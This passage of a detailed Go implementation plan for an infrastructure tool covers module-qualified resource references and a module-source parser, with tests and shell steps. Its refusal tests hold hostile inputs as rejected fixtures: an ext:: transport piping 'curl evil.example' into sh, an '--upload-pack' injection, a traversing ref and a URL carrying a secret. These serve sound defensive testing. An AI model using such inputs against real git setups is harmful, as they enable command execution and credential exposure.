		t.Errorf("%s resolved to %q", qualified, s)
	}
}
```

Do not run it yet: the package does not compile until step 1.4.

#### 1.4 — Update every remaining site

`internal/expressions/parse.go`, in `parseReference` — replace the two returns:

```go
	// One segment is a variable; two or more is a resource attribute. The
	// compiler resolves each against a different scope.
	//
	// Both are SCOPE-RELATIVE: the parser has no scope, so it cannot know
	// whether it is reading a module file or infra.yml, and a reference
	// written inside a module is re-rooted by stage 5 rather than here.
	if len(segments) == 1 {
		return &value.Expr{
			Op:     value.OpVarRef,
			Ref:    value.VarRef(segments[0]),
			Origin: origin,
		}
	}
	return &value.Expr{
		Op:     value.OpResourceRef,
		Ref:    value.LocalRef(strings.Join(segments[:len(segments)-1], "."), segments[len(segments)-1]),
		Origin: origin,
	}
```

`internal/expressions/eval.go`, the `OpVarRef` arm — bind the name once:

```go
	case value.OpVarRef:
		name := e.Ref.VarName()
		v, ok := scope.Variable(name)
		if !ok {
			ds.Add(diag.Diagnostic{
				Severity: diag.SeverityError,
				Summary:  "undefined variable " + strconv.Quote(name),
				Detail:   "No variable of that name is in scope.",
				Action:   "Define it in variables.yml, or pass --var " + name + "=value.",
				Origin:   e.Origin,
			})
			return unknownFrom(e, value.KindString, false)
		}
		return v.WithOrigin(e.Origin)
```

`internal/expressions/resources.go` — replace the lookup line and the paragraph of its doc
comment that describes the bug as future work (the paragraph beginning "A reference names a
resource, not an address"):

```go
	// Keyed by the reference's own canonical address, so a resource inside a
	// module and a same-named resource at the root are two different keys.
	// Before M5 this constructed a root address from a bare name, which was
	// correct only because nothing could produce a non-empty module path yet;
	// value.Reference now carries one (contract Ruling 1).
	attrs, ok := s[ref.Target.String()]
```

`address` is now unused in that file — it was imported for that one construction — so delete
`"github.com/infrata/infrata/pkg/address"` from its import block, or the package will not
compile.

`internal/compiler/bind.go`, in `bindAttribute`'s reference loop — bind the canonical target
once and use it in all four places:

```go
	for _, ref := range e.References() {
		// The canonical address string, not the bare name: after stage 5 a
		// reference may carry a module path, and `declared` is keyed by the
		// same rendering.
		target := ref.Target.String()
		switch {
		case !declared[target]:
			ds.Add(diag.Diagnostic{
				Severity: diag.SeverityError,
				Summary:  "reference to undeclared resource " + strconv.Quote(target),
				Detail: "${" + ref.String() + "} names a resource that does not exist.\nKnown resources:\n  " +
					strings.Join(sortedNames(declared), "\n  "),
				Action: "Correct the reference, or declare " + strconv.Quote(target) + ".",
				Origin: attr.Origin,
			})
		case target == decl.Name:
			ds.Add(diag.Diagnostic{
				Severity: diag.SeverityError,
				Summary:  "resource " + strconv.Quote(decl.Name) + " refers to itself",
				Detail:   "${" + ref.String() + "} cannot be resolved: its own value would be required to compute it.",
				Origin:   attr.Origin,
			})
		default:
			recordEdge(edges, target, attr.Origin)
		}
	}
```

The three remaining test files:

```bash
sed -i 's/value\.Reference{Resource: \("[^"]*"\), Attribute: \("[^"]*"\)}/value.LocalRef(\1, \2)/g' \
  internal/expressions/resources_test.go internal/compiler/resolved_test.go
sed -i \
  -e 's/value\.Reference{Resource: res, Attribute: attr}/value.LocalRef(res, attr)/g' \
  internal/compiler/resolved_test.go
sed -i 's/value\.Reference{Resource: "environment"}/value.VarRef("environment")/' \
  internal/executor/resolve_test.go
sed -i 's/\.Ref\.Resource/.Ref.Target.Name/g' internal/expressions/parse_test.go
grep -rn "Reference{Resource\|Ref\.Resource\|ref\.Resource" --include=*.go .   # must print nothing
git diff internal/   # read every hunk
```

Then:

```bash
go build ./... && go vet ./... && gofmt -l .
```

**Expected: all three silent.** `gofmt -l .` printing a path means fix it before continuing.

#### 1.4a — The `module`-segment guard

Write the tests first. Append to `internal/expressions/parse_test.go`:

```go
// TestReferenceIntoAModuleIsRefused is contract Amendment 14a.
//
// ${module.prod.database.id} parses to the target name "module.prod.database",
// and address.Address{Name: "module.prod.database"}.String() returns that
// verbatim — byte for byte what Address{Module: ["prod"], Name: "database"}
// renders for the REAL database inside instance prod. Stage 6 keys its target
// map by canonical address, so without this guard the two collide and a user
// can reach inside a module. A module exposes outputs, not resources.
//
// The nested case is here because a two-level address has `module` at position
// 0 AND 2, so a guard that checked only the first segment would pass the first
// case and leak the second.
func TestReferenceIntoAModuleIsRefused(t *testing.T) {
	for _, src := range []string{
		"${module.prod.database.id}",
		"${module.prod.module.net.vpc.id}",
		"${prod.module.net.vpc.id}",
	} {
		t.Run(src, func(t *testing.T) {
			e, ds := Parse(src, value.Origin{File: "infra.yml", Line: 3})
			if !ds.HasErrors() {
				t.Fatalf("Parse(%q) produced no error; a module's internals are addressable from outside it", src)
			}
			d := ds[0]
			text := d.Summary + " | " + d.Detail + " | " + d.Action
			if !strings.Contains(text, "names a module's internals") {
				t.Errorf("wrong diagnostic: %s", text)
			}
			if !strings.Contains(d.Action, "outputs") {
				t.Errorf("action does not name the alternative: %s", d.Action)
			}
			if e != nil && e.Op == value.OpResourceRef && len(e.Ref.Target.Module) == 0 {
				t.Errorf("a rejected reference still produced a resource target %q", e.Ref.Target.String())
			}
		})
	}
}

// TestReferenceNamingTheInstanceIsAccepted is the half that stops the guard
// being satisfied by rejecting everything.
//
// ${prod.endpoint} is how a caller reads a module instance's output, and it is
// the spelling PLAN.md §11.2 shows. A guard that refused it would make modules
// unusable while passing every assertion in the test above.
func TestReferenceNamingTheInstanceIsAccepted(t *testing.T) {
	for _, src := range []string{"${prod.endpoint}", "${database.connection_string}"} {
		t.Run(src, func(t *testing.T) {
			e, ds := Parse(src, value.Origin{File: "infra.yml", Line: 3})
			if ds.HasErrors() {
				t.Fatalf("Parse(%q) errored: %v", src, ds)
			}
			if e.Op != value.OpResourceRef {
				t.Fatalf("Op = %v, want OpResourceRef", e.Op)
			}
			if len(e.Ref.Target.Module) != 0 {
				t.Errorf("a parsed reference carries a module path %v; Qualify fills it, not the parser",
					e.Ref.Target.Module)
			}
		})
	}
}

// TestResourceNamedModuleIsRefusedWithItsOwnReason.
//
// ${module.id} is not someone reaching into a module — it is a resource
// literally named `module`, which address.Parse already cannot round-trip
// ("module" alone is "must be followed by a module name"). It gets its own
// action, because "reference one of the module's outputs instead" would be
// nonsense advice for it.
func TestResourceNamedModuleIsRefusedWithItsOwnReason(t *testing.T) {
	_, ds := Parse("${module.id}", value.Origin{File: "infra.yml", Line: 3})
	if !ds.HasErrors() {
		t.Fatal("a resource named `module` parsed cleanly; its address cannot round-trip")
	}
	if !strings.Contains(ds[0].Action, "Rename") {
		t.Errorf("action does not tell the user to rename the resource: %s", ds[0].Action)
	}
}

// TestQualifiedReferencesDoNotRouteThroughTheParser pins WHY the guard can live
// at parse time.
//
// Qualify sets Target.Module structurally on an already-parsed expression; it
// never re-parses a rendered address. If it did, every qualified reference would
// hit the guard above and modules would not work at all. This test states the
// property the guard depends on in the one place a reader will look for it.
func TestQualifiedReferencesDoNotRouteThroughTheParser(t *testing.T) {
	e, ds := Parse("${db.id}", value.Origin{File: "module.yml", Line: 2})
	if ds.HasErrors() {
		t.Fatalf("unexpected errors: %v", ds)
	}
	qualified := e.Ref.InModule("net")
	if qualified.String() != "module.net.db.id" {
		t.Fatalf("InModule gave %q", qualified.String())
	}
	// The rendered form is exactly what the guard refuses as INPUT. That is the
	// point: it is produced, never typed.
	if _, ds := Parse("${"+qualified.String()+"}", value.Origin{File: "infra.yml", Line: 1}); !ds.HasErrors() {
		t.Error("the guard does not refuse a rendered qualified address; it must, or a user can type one")
	}
}
```

`internal/expressions/parse_test.go` already imports `strings` (line 4 at HEAD), so its
import block needs no change.

Verified at HEAD before writing this: no existing fixture or test anywhere in the tree uses a
`module` segment inside a `${...}`, so the guard breaks nothing —
`grep -rn '\${[^}]*module[^}]*}' --include=*.go --include=*.yml .` returns nothing.

Run:

```bash
go test ./internal/expressions/ -count=1 -run 'TestReference|TestResourceNamedModule|TestQualified'
```

**Expected failure:** `Parse("${module.prod.database.id}") produced no error`. Nothing
refuses a `module` segment yet.

Now add the guard to `parseReference` in `internal/expressions/parse.go`, immediately after
the existing empty-segment loop and BEFORE the one-segment/variable branch:

```go
	// A user-written reference never contains a `module` segment. Qualify
	// PRODUCES module-qualified targets at stage 6; the parser must never accept
	// one (contract Amendment 14a).
	//
	// This is not a stylistic rule. ${module.prod.database.id} parses to the
	// target name "module.prod.database", and address.Address{Name:
	// "module.prod.database"}.String() returns that verbatim — byte for byte
	// what Address{Module: ["prod"], Name: "database"} renders for the real
	// resource inside instance prod. Stage 6 keys its target map by canonical
	// address, so the two collide and a module's internals become addressable
	// from outside it. A module exposes its outputs, not its resources
	// (PLAN.md §11.2).
	//
	// At parse time the two are trivially distinguishable, because Qualify has
	// not run and never routes through here — it sets Target.Module structurally
	// on an already-parsed expression. A guard at the lookup instead would have
	// to tell "qualified by Qualify" from "typed by the user" when both are the
	// same bytes, which is not a check that can be made right.
	for i, s := range segments {
		if s != "module" {
			continue
		}
		// Two different mistakes wear the same segment, and telling a user to
		// reference an output would be nonsense for the second.
		if i+2 <= len(segments)-1 {
			instance := segments[i+1]
			ds.Add(diag.Diagnostic{
				Severity: diag.SeverityError,
				Summary:  "reference ${" + src + "} names a module's internals",
				Detail: "`module` is part of an ADDRESS — how a resource is named in state and in a plan — " +
					"and is never part of a reference. A module exposes its OUTPUTS to its caller, not the " +
					"resources it contains, so nothing inside " + strconv.Quote(instance) +
					" can be referenced from outside it.",
				Action: "Reference one of its outputs instead, as ${" + instance + ".<output>}, and add an " +
					"`outputs:` entry to the module if it does not already publish the value you need.",
				Origin: origin,
			})
			return nil
		}
		ds.Add(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "reference ${" + src + "} names a resource called " + strconv.Quote("module"),
			Detail: "`module` is reserved: it is the first segment of every module-qualified address, so a " +
				"resource with that name has an address that cannot be read back unambiguously.",
			Action: "Rename the resource to something other than " + strconv.Quote("module") + ".",
			Origin: origin,
		})
		return nil
	}
```

Run:

```bash
go test ./internal/expressions/ -count=1
```

**Expected: green**, including `TestReferenceNamingTheInstanceIsAccepted` — if that one fails
the guard is rejecting the ordinary case and modules are unusable.

Then prove the guard discriminates rather than merely existing:

```bash
# Check only the FIRST segment, which is the guard a reader writes by reflex.
sed -i 's|^\tfor i, s := range segments {$|\tfor i, s := range segments[:1] {|' internal/expressions/parse.go
go test ./internal/expressions/ -count=1 -run TestReferenceIntoAModuleIsRefused
```

**Expected: FAIL** on the `${prod.module.net.vpc.id}` case only — the two that begin with
`module` are still caught, which is exactly why that third fixture is in the table. Restore
the line.

#### 1.5 — Run the full suite, then prove the new test discriminates

```bash
go test -race -count=1 ./...
```

**Expected: every package green**, including the three new tests in
`internal/expressions/resources_test.go`.

A test that names an invariant is not evidence the invariant holds. Verify by breaking the
fix and watching it fail:

```bash
sed -i 's/s\[ref\.Target\.String()\]/s[ref.Target.Name]/' internal/expressions/resources.go
go test ./internal/expressions/ -count=1 -run TestAttributeResolvesWithinItsModule
```

**Expected: FAIL**, reporting `resolved to "root.example.com", want "net.example.com"`.
That is the silently wrong plan, reproduced. Restore:

```bash
sed -i 's/s\[ref\.Target\.Name\]/s[ref.Target.String()]/' internal/expressions/resources.go
go test -race -count=1 ./internal/expressions/
```

If the reverted lookup had passed, the fixture was not reaching the guard and the test is
worthless — stop and fix the fixture rather than continuing.

#### 1.6 — Commit

```bash
git add pkg/value/reference_test.go
git add pkg/value/expr.go pkg/value/expr_test.go \
        internal/expressions/parse.go internal/expressions/parse_test.go \
        internal/expressions/eval.go \
        internal/expressions/resources.go internal/expressions/resources_test.go \
        internal/compiler/bind.go internal/compiler/resolved_test.go \
        internal/executor/resolve_test.go
git commit -m "value.Reference names a resource by address, not by bare name

A bare-name reference cannot tell \${db.id} inside a module from \${db.id} at
the root. Once stage 5 re-roots a module's resources, that lookup misses the
module's resource or matches a same-named one elsewhere and returns its
attributes — a silently wrong plan. Expr.References() deduplicates on the same
rendering, so it also collapsed two modules' same-named dependencies into one
edge, breaking acceptance invariant 4.

Reference now carries an address.Address, so a reference and an address are one
spelling of \"which resource\" and cannot drift. LocalRef keeps the root case a
one-liner; InModule delegates to Address.InModule, which copies the slice.

Carrying the module path also opens the reverse leak, so the parser now refuses a
\`module\` segment. \${module.prod.database.id} parses to the target name
\"module.prod.database\", which Address.String() renders identically to the real
Address{Module: [prod], Name: database} — so stage 6's address-keyed lookup would
match, and a module's internals would be addressable from outside it. The guard
is at parse time because Qualify PRODUCES that spelling and never parses one: at
the lookup the two are the same bytes and cannot be told apart.

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>" \
  -- pkg/value/reference_test.go pkg/value/expr.go pkg/value/expr_test.go \
     internal/expressions/parse.go internal/expressions/parse_test.go \
     internal/expressions/eval.go \
     internal/expressions/resources.go internal/expressions/resources_test.go \
     internal/compiler/bind.go internal/compiler/resolved_test.go \
     internal/executor/resolve_test.go
```

---

---

## Task 11 — `Parse` and `DeriveName`: the source grammar, every refusal, and the name

### Why this task exists

`Parse` is the whole of the trust boundary. Everything downstream hands its output to
`git` as an argument, so a string that reaches `Cache.Resolve` as `KindGit` is a string
this function decided was a repository URL. Two of Amendment 10's four correctness
surfaces live here entirely (10a, an unpinned remote is an error; 10c, the injection
guards), and it is a pure function over a string, so both are testable with no filesystem,
no subprocess and no fixture.

The grammar:

```text
source  := path | gitURL
path    := anything with no scheme, no "::" transport prefix, and no
           user@host: shorthand — resolved relative to the file that declared it
gitURL  := ("https://" | "ssh://") authority "/" repopath ":" ref
         | userinfo "@" host ":" repopath ":" ref
ref     := a tag name or a commit hash, 1-128 chars, [A-Za-z0-9._/+-],
           not starting with "-" or ".", no "..", not ending ".lock"
```

### Files

| Action | Path |
|--------|------|
| create | `internal/modules/source/source.go` |
| create | `internal/modules/source/source_test.go` |

### Interfaces

**Consumes:** `internal/diag`, `pkg/value` (for `value.Origin`). Nothing else — not
`net/url`, which parses far more than this grammar admits and would happily accept
`ext::sh -c ...` as an opaque URL.

**Produces:**

```go
package source // internal/modules/source

type Kind int

const (
    KindPath Kind = iota // a directory on this filesystem
    KindGit              // a git repository, pinned to a tag or a commit
)

func (k Kind) String() string

// Source is a parsed module source. Location is the repository URL with the
// ":ref" suffix removed (KindGit) or the path exactly as written (KindPath).
type Source struct {
    Kind     Kind
    Location string
    Ref      string       // empty for KindPath; required and non-empty for KindGit
    Origin   value.Origin // where the source was declared
}

// PinnedToHash reports whether Ref names a commit rather than a tag.
func (s Source) PinnedToHash() bool

func Parse(raw string, origin value.Origin) (Source, diag.Diagnostics)

// String renders a source in the spelling it was written in.
func (s Source) String() string

// DeriveName derives the identifier a scalar `modules:` entry is loaded under.
func DeriveName(s Source) (string, diag.Diagnostics)
```

**`DeriveName` takes a parsed `Source`, never a string.** Amendment 13d: derivation and
parsing split the same text at the same two boundaries — where the ref ends, and where the
repository path begins — and two implementations of one boundary drift. Here the ref is
already gone (`Parse` removed it) and the path is found by the same `splitScheme` /
`splitSCP` helpers `Parse` uses, so there is one answer and one place it is computed.

**`String()` is an EXACT round trip, not a normalised rendering — decided, and the
decision is cheap to keep.** Author A asked because `infra export` (§28) has to regenerate
a `modules:` entry, and Author B asked because a cycle chain and a load failure have to
name a source. One answer serves both, and it is the strong one:

> For any `raw` that `Parse` accepts, `Parse(raw).String() == raw`, byte for byte.

That holds **by construction rather than by care**: `Parse` only ever *splits*. It refuses
surrounding whitespace instead of trimming it, it lower-cases a scheme for the
classification switch but stores the original text in `Location`, and it never rewrites,
canonicalises or appends. So a trailing slash, an omitted `.git`, an uppercase host and a
port all survive, and `export` regenerates the user's own spelling with no bounded
inexactness to document. Step 11.2b pins it as a property over the whole accepted table,
which is what keeps a later "helpful" normalisation from landing silently.

The hazard A found is real but it lands on `DeriveName`, not here: derivation IS lossy —
`./modules/networking/` and `./modules/networking` derive the same name — and that is
correct, because a name is a name. Losing information on the way to a name and keeping all
of it on the way back to a source are different requirements, and one type can satisfy
both only because they are different functions.

One caveat worth a sentence in the doc comment: a `Source` built by hand rather than by
`Parse` — which Tasks 12 and 13 do, for a local bare repository — renders as
`<path>:<ref>`, a string `Parse` would refuse. That is fine for a diagnostic and is not a
round trip, because nothing round-trips a value that was never parsed.

### Steps

#### 11.1 Failing test: the forms that are accepted

Create `internal/modules/source/source_test.go`:

```go
package source

import (
	"strings"
	"testing"

	"github.com/infrata/infrata/pkg/value"
)

var testOrigin = value.Origin{File: "infra.yml", Line: 4, Column: 5}

func TestParseAcceptsTheThreeSourceForms(t *testing.T) {
	for _, tc := range []struct {
		name     string
		raw      string
		wantKind Kind
		wantLoc  string
		wantRef  string
	}{
		{"relative path", "./modules/networking", KindPath, "./modules/networking", ""},
		{"parent-relative path", "../shared/net", KindPath, "../shared/net", ""},
		{"absolute path", "/opt/infra/modules/net", KindPath, "/opt/infra/modules/net", ""},
		{"bare path", "modules/net", KindPath, "modules/net", ""},
		{"https pinned to a tag", "https://github.com/acme/infra-app-stack:v1.2.0",
			KindGit, "https://github.com/acme/infra-app-stack", "v1.2.0"},
		{"https with .git", "https://github.com/acme/infra-app-stack.git:v1.2.0",
			KindGit, "https://github.com/acme/infra-app-stack.git", "v1.2.0"},
		{"scp shorthand pinned to a hash", "git@github.com:acme/infra-database:9f3c1ab",
			KindGit, "git@github.com:acme/infra-database", "9f3c1ab"},
		{"ssh with a port", "ssh://git@git.example.com:2222/acme/repo:v1.0.0",
			KindGit, "ssh://git@git.example.com:2222/acme/repo", "v1.0.0"},
		{"tag containing a slash", "https://github.com/acme/repo:release/1.0",
			KindGit, "https://github.com/acme/repo", "release/1.0"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			s, ds := Parse(tc.raw, testOrigin)
			if ds.HasErrors() {
				t.Fatalf("Parse(%q) reported %+v, want it accepted", tc.raw, ds)
			}
			if s.Kind != tc.wantKind {
				t.Errorf("Kind = %v, want %v", s.Kind, tc.wantKind)
			}
			if s.Location != tc.wantLoc {
				t.Errorf("Location = %q, want %q", s.Location, tc.wantLoc)
			}
			if s.Ref != tc.wantRef {
				t.Errorf("Ref = %q, want %q", s.Ref, tc.wantRef)
			}
			if s.Origin != testOrigin {
				t.Errorf("Origin = %+v, want the origin it was given: a diagnostic raised later must name the line the source was written on", s.Origin)
			}
		})
	}
}

// TestParseDistinguishesAHashPinFromATagPin is not cosmetic: 13.6 skips the
// network for a hash pin and must NOT skip it for a tag pin, so a tag
// misclassified as a hash would make a moved tag undetectable — Amendment
// 10b's failure mode exactly.
func TestParseDistinguishesAHashPinFromATagPin(t *testing.T) {
	for raw, wantHash := range map[string]bool{
		"https://h/r:9f3c1ab":                                  true,
		"https://h/r:34d6815f4599c14a529743d34402000ca8e52f7f": true,
		"https://h/r:v1.2.0":                                    false,
		"https://h/r:release/1.0":                               false,
		"https://h/r:9f3c1a":                                    false, // six chars: too short to be a hash
		"https://h/r:9f3c1abg":                                  false, // not hex
		"./modules/net":                                         false,
	} {
		s, ds := Parse(raw, testOrigin)
		if ds.HasErrors() {
			t.Fatalf("Parse(%q): %+v", raw, ds)
		}
		if got := s.PinnedToHash(); got != wantHash {
			t.Errorf("Parse(%q).PinnedToHash() = %v, want %v", raw, got, wantHash)
		}
	}
}
```

#### 11.2 Failing test: every refusal, and what each diagnostic must say

Append to the same file. Each case asserts on a substring that a reader of the message
would recognise, not on the whole string — but each substring is the specific thing that
tells the user which rule they hit.

```go
func TestParseRefusals(t *testing.T) {
	for _, tc := range []struct {
		name      string
		raw       string
		want      []string // every one must appear in the rendered diagnostic
		forbidden []string // none of these may appear
	}{
		{
			name: "an unpinned https remote",
			raw:  "https://github.com/acme/infra-app-stack",
			want: []string{"is not pinned", ":v1.2.0", "plans differently"},
		},
		{
			// C3: the last colon in this string separates the host from the
			// path, not the path from a ref. Split on it and the source
			// parses as pinned to "acme/infra-database", the guard never
			// fires, and git reports a missing ref instead.
			name: "an unpinned scp-shorthand remote",
			raw:  "git@github.com:acme/infra-database",
			want: []string{"is not pinned", "acme/infra-database"},
		},
		{
			name: "an ext:: transport",
			raw:  "ext::sh -c 'curl evil.example|sh'",
			want: []string{"ext::", "runs a shell command", "https://"},
		},
		{
			name: "a git:: transport helper",
			raw:  "git::https://example.invalid/net",
			want: []string{"git::", "https://example.invalid/net"},
		},
		{
			name: "a file:// url",
			raw:  "file:///srv/modules/net",
			want: []string{"file://", "/srv/modules/net"},
		},
		{
			name: "an http url",
			raw:  "http://github.com/acme/repo:v1",
			want: []string{"http", "https://", "ssh://"},
		},
		{
			name: "a flag",
			raw:  "--upload-pack=touch /tmp/pwned",
			want: []string{"begins with \"-\"", "option"},
		},
		{
			// The diagnostic must NOT echo the source: it holds the
			// secret, and this package has no redaction path.
			name:      "credentials in the url",
			raw:       "https://user:ghp_secret@github.com/acme/repo:v1",
			want:      []string{"credentials", "credential helper"},
			forbidden: []string{"ghp_secret"},
		},
		{
			name: "an empty ref",
			raw:  "https://github.com/acme/repo:",
			want: []string{"empty"},
		},
		{
			name: "a ref that traverses",
			raw:  "https://github.com/acme/repo:../../etc",
			want: []string{"not a valid tag or commit"},
		},
		{
			name: "a ref that is a flag",
			raw:  "https://github.com/acme/repo:-upload-pack",
			want: []string{"not a valid tag or commit"},
		},
		{
			name: "a remote with no repository path",
			raw:  "https://github.com:v1",
			want: []string{"no repository path"},
		},
		{
			name: "an empty source",
			raw:  "",
			want: []string{"empty"},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			s, ds := Parse(tc.raw, testOrigin)
			if !ds.HasErrors() {
				t.Fatalf("Parse(%q) returned %+v with no error; this source must be refused", tc.raw, s)
			}
			var sb strings.Builder
			ds.Render(&sb)
			got := sb.String()
			for _, want := range tc.want {
				if !strings.Contains(got, want) {
					t.Errorf("diagnostic does not mention %q:\n%s", want, got)
				}
			}
			for _, never := range tc.forbidden {
				if strings.Contains(got, never) {
					t.Errorf("diagnostic contains %q, which must never be printed:\n%s", never, got)
				}
			}
			if !strings.Contains(got, "Suggested action:") {
				t.Errorf("diagnostic has no action (§44):\n%s", got)
			}
			if !strings.Contains(got, "infra.yml:4:5") {
				t.Errorf("diagnostic does not say where (§44):\n%s", got)
			}
		})
	}
}

// TestParseNeverReturnsAGitSourceForAPath is the other half of the seam named
// in "What is NOT here": Tasks 12 and 13 test git fetching against a local bare
// repository by building a Source literal, which is only honest if Parse
// cannot produce that combination from configuration. Delete the file://
// refusal or the path branch and this fails.
func TestParseNeverReturnsAGitSourceForAPath(t *testing.T) {
	for _, raw := range []string{
		"/tmp/some/bare.git",
		"./bare.git",
		"../bare.git:v1.0.0", // a path that looks pinned is still a path
	} {
		s, ds := Parse(raw, testOrigin)
		if ds.HasErrors() {
			continue // refused is also acceptable; classified as git is not
		}
		if s.Kind == KindGit {
			t.Errorf("Parse(%q).Kind = KindGit; a filesystem location must never be classified as a remote", raw)
		}
	}
}
```

Note the third case in that last test: `../bare.git:v1.0.0` is a **path**, colon and all,
because there is no scheme and no `user@host:`. A path containing a colon is legal on this
filesystem and this language has no way to spell "a local repository at a tag" — the
module is the directory. Say so in the doc comment on `Parse`.

#### 11.2a Failing test: the derived name

Append to `source_test.go`. Amendment 8d's rule is: the last path segment of `Location`,
`.git` stripped, `-` normalised to `_`.

```go
func TestDeriveName(t *testing.T) {
	for raw, want := range map[string]string{
		"./modules/networking":                            "networking",
		"./modules/networking/":                           "networking",
		"/opt/infra/modules/app-stack":                    "app_stack",
		"https://github.com/acme/infra-app-stack:v1.2.0":  "infra_app_stack",
		"https://github.com/acme/infra-app-stack.git:v1.2.0": "infra_app_stack",
		// The strip order finding, from Author A. ":ref" comes off before
		// ".git" — reversed, nothing strips (the string does not END in
		// ".git") and the name comes out as "infra.git", which is not an
		// identifier. Here the order is structural: Parse already removed
		// the ref, and DeriveName reads Location. 11.6 sabotage 3 is the
		// discrimination step that proves this test sees it.
		"https://github.com/acme/infra.git:v1.2.0": "infra",
		// git's scp shorthand on a host with no owner segment. There is no
		// "/" in it at all, so a last-"/"-then-last-":" split derives the
		// HOST. This package owns that grammar, and it derives the
		// repository: infra_db.
		"git@github.com:infra-db:v1.0.0":       "infra_db",
		"git@github.com:acme/infra-db:v1.0.0":  "infra_db",
		"ssh://git@git.example.com:2222/acme/repo:v1.0.0": "repo",
	} {
		src, ds := Parse(raw, testOrigin)
		if ds.HasErrors() {
			t.Fatalf("Parse(%q): %+v", raw, ds)
		}
		got, ds := DeriveName(src)
		if ds.HasErrors() {
			t.Fatalf("DeriveName(%q): %+v", raw, ds)
		}
		if got != want {
			t.Errorf("DeriveName(%q) = %q, want %q", raw, got, want)
		}
	}
}

// TestDeriveNameRefusesWhatIsNotAnIdentifier covers the case Author A's
// retired fixture was aiming at. A derived name is used as `module.<name>` in a
// resource type, so it has to be an identifier; when it cannot be, the answer
// is a diagnostic telling the user to write `name:` — which is exactly why the
// mapping form of a `modules:` entry exists (Amendment 8d).
func TestDeriveNameRefusesWhatIsNotAnIdentifier(t *testing.T) {
	for _, raw := range []string{
		"./modules/.",
		"..",
		"./modules/2fast",
		"./modules/my module",
	} {
		src, ds := Parse(raw, testOrigin)
		if ds.HasErrors() {
			continue // refused earlier is fine; deriving a bad name is not
		}
		name, ds := DeriveName(src)
		if !ds.HasErrors() {
			t.Errorf("DeriveName(%q) = %q with no diagnostic; it is not a usable module name", raw, name)
			continue
		}
		var sb strings.Builder
		ds.Render(&sb)
		if !strings.Contains(sb.String(), "name:") {
			t.Errorf("the diagnostic for %q does not tell the user to write `name:`, which is the only fix:\n%s", raw, sb.String())
		}
	}
}
```

**This table is canonical** (Amendment 20a). `config.deriveModuleName` was written
independently by Author A and is being deleted in favour of this; when A's rows arrive,
fold any spelling they cover that is not already here into the table above rather than
keeping a second list somewhere.

An **unpinned** scp source (`git@github.com:infra-db`) never reaches `DeriveName` at all:
`Parse` refuses it first, because the repository path carries no `:ref`. The two cases are
easy to confuse — one is a grammar question, the other a pinning question — so the table
above uses the pinned spelling and `TestParseRefusals` keeps the unpinned one.

#### 11.2b Failing test: `String()` round-trips exactly

Append to `source_test.go`. This is a property over the same table 11.1 accepts, rather
than a handful of examples, because the claim is about every input `Parse` admits:

```go
// TestStringRoundTripsEveryAcceptedSource pins the decision that String() is an
// exact round trip and not a normalised rendering. infra export (§28)
// regenerates a `modules:` entry from it, so a source that comes back with a
// trailing slash dropped or a ".git" restored would rewrite the user's own file
// under them.
//
// It is a property over every accepted spelling rather than a few examples,
// because the failure mode of a normalising String() is that it round-trips the
// examples somebody thought of.
func TestStringRoundTripsEveryAcceptedSource(t *testing.T) {
	for _, raw := range []string{
		"./modules/networking",
		"./modules/networking/",       // the trailing slash must survive
		"/opt/infra/modules/net",
		"modules/net",
		"https://github.com/acme/infra-app-stack:v1.2.0",
		"https://github.com/acme/infra-app-stack.git:v1.2.0", // and the .git
		"https://GitHub.com/Acme/Repo:v1.2.0",                // and the case
		"git@github.com:acme/infra-database:9f3c1ab",
		"git@github.com:infra-db:v1.0.0",
		"ssh://git@git.example.com:2222/acme/repo:v1.0.0",    // and the port
		"https://github.com/acme/repo:release/1.0",
	} {
		src, ds := Parse(raw, testOrigin)
		if ds.HasErrors() {
			t.Fatalf("Parse(%q): %+v", raw, ds)
		}
		if got := src.String(); got != raw {
			t.Errorf("Parse(%q).String() = %q; String must return the spelling the user wrote, because `infra export` writes it back into their file", raw, got)
		}
	}
}
```

#### 11.3 Run it, see it fail

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go test -count=1 ./internal/modules/source/
```

Expect `no required module provides package` / no such directory — the package does not
exist. Create `source.go` with the types and a `Parse` that returns
`Source{Kind: KindPath, Location: raw}` and no diagnostics, re-run, and expect the
accepted-forms table to fail on the https rows and every refusal row to fail with
"returned ... with no error". That is the honest failure: nothing is validated yet.

#### 11.4 Minimal code: the grammar

Create `internal/modules/source/source.go`:

```go
// Package source turns a module source string into a directory on disk.
//
// A source is either a filesystem path — absolute, or relative to the file that
// declared it — or a git repository pinned to a tag or a commit. The pin is
// required: an unpinned remote means the same configuration plans differently on
// different days, which breaks the plan-determinism invariant (PLAN.md §47)
// silently and at a distance.
//
// Everything Parse classifies as KindGit is eventually handed to the git binary
// as an argument, so Parse is a trust boundary and not a convenience. It accepts
// three spellings and refuses everything else by name.
package source

import (
	"strconv"
	"strings"

	"github.com/infrata/infrata/internal/diag"
	"github.com/infrata/infrata/pkg/value"
)

// Kind is how a module source names its content.
type Kind int

const (
	// KindPath is a directory on this filesystem.
	KindPath Kind = iota
	// KindGit is a git repository, pinned to a tag or a commit.
	KindGit
)

// String names a kind for diagnostics. It is a switch with an explicit default
// rather than a two-armed if, for the reason diag.Severity.String gives: an
// unrecognised value must read as corruption, not as one of the real kinds.
func (k Kind) String() string {
	switch k {
	case KindPath:
		return "path"
	case KindGit:
		return "git"
	default:
		return "Kind(" + strconv.Itoa(int(k)) + ")"
	}
}

// Source is a parsed module source.
//
// For KindGit, Location is the repository URL with the ":ref" suffix removed and
// Ref is that suffix. For KindPath, Location is the path exactly as written and
// Ref is empty: a path names a directory, and this language has no spelling for
// a local repository at a tag, so "../mod:v1" is a path whose name contains a
// colon.
type Source struct {
	Kind     Kind
	Location string
	Ref      string
	Origin   value.Origin
}

// PinnedToHash reports whether Ref names a commit rather than a tag. The cache
// may skip the network for a commit, which names an immutable object, and may
// never skip it for a tag, which does not.
//
// Seven is git's own minimum abbreviation and the length PLAN.md §11 uses
// ("9f3c1ab"). A tag literally named like a short hash would be misclassified;
// that costs a redundant network round trip's absence, and fetchCommit (12.6)
// resolves such a ref through the route that tries refs before object prefixes.
func (s Source) PinnedToHash() bool {
	if s.Kind != KindGit || len(s.Ref) < 7 || len(s.Ref) > 40 {
		return false
	}
	for _, r := range s.Ref {
		if !('0' <= r && r <= '9') && !('a' <= r && r <= 'f') {
			return false
		}
	}
	return true
}

// String renders the source in the spelling it was written in, and is an EXACT
